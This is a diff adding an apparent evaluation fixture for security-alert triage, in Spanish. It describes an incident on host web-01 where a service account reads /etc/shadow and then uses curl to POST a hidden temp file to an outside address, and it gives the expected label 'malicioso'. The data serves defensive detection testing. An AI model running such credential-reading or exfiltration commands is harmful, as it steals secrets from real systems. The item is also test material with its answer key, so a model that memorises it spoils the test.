@@ -1,0 +1,20 @@
+{
+  "incidente_id": "EVAL-M04",
+  "host": "web-01",
+  "segmento": "servicios",
+  "alertas": [
+    {"alerta_id": "ALR-EVAL-M04-1", "regla_id": "R-T1003-lectura-shadow", "tecnica": "T1003.008", "severidad": "critica",
+     "descripcion": "Lectura de /etc/shadow por un usuario de servicio", "eventos": ["EVT-M04-1"]},
+    {"alerta_id": "ALR-EVAL-M04-2", "regla_id": "R-T1041-subida-desde-shell", "tecnica": "T1041", "severidad": "alta",
+     "descripcion": "Envío de un archivo por HTTP POST desde un shell", "eventos": ["EVT-M04-2", "EVT-M04-3"]}
+  ],
+  "eventos": [
+    {"evento_id": "EVT-M04-1", "ts": "2026-11-13T16:20:10Z", "host": "web-01", "tipo": "archivo",
+     "datos": {"ruta": "/etc/shadow", "operacion": "leer", "usuario": "www-data", "proceso": "/bin/cat"}},
+    {"evento_id": "EVT-M04-2", "ts": "2026-11-13T16:20:12Z", "host": "web-01", "tipo": "proceso",
+     "datos": {"padre": "sh", "proceso": "/usr/bin/curl", "usuario": "www-data", "cmdline": "curl -s -X POST --data-binary @/tmp/.s http://10.99.0.80/u"}},
+    {"evento_id": "EVT-M04-3", "ts": "2026-11-13T16:20:12Z", "host": "web-01", "tipo": "conexion",
+     "datos": {"ip_origen": "10.20.0.11", "ip_destino": "10.99.0.80", "puerto_destino": 80, "protocolo": "tcp", "bytes_enviados": 48211}}
+  ],
+  "etiqueta_esperada": "malicioso"
+}
